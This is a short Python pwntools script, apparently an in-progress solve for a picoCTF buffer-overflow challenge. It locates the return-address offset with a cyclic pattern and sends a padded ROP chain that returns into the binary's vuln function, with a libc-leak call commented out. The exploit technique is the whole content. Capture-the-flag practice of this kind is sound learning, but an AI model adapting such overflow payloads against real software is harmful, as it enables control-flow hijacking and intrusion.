from pwn import *

from pprint import pprint

context.update(arch='i386', os='linux') #acquired context from file command

elf = ELF("./vuln")
# p = remote("saturn.picoctf.net", 52632) #ports may vary between different instance launched
p = elf.process()

rop = ROP(elf)

puts = elf.symbols['puts']

# rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['vuln'])

# pprint(elf.symbols['puts'])

#dmesg after running this shows us the IP being overwritten to 0x61616168
# p.sendline(cyclic(50)) 

print(p.recvuntil('\n')) #the prompt

payload = [
    cyclic(cyclic_find(0x61616168)),
    rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)

print(p.recvuntil('\n')) 

p.interactive()
p.close()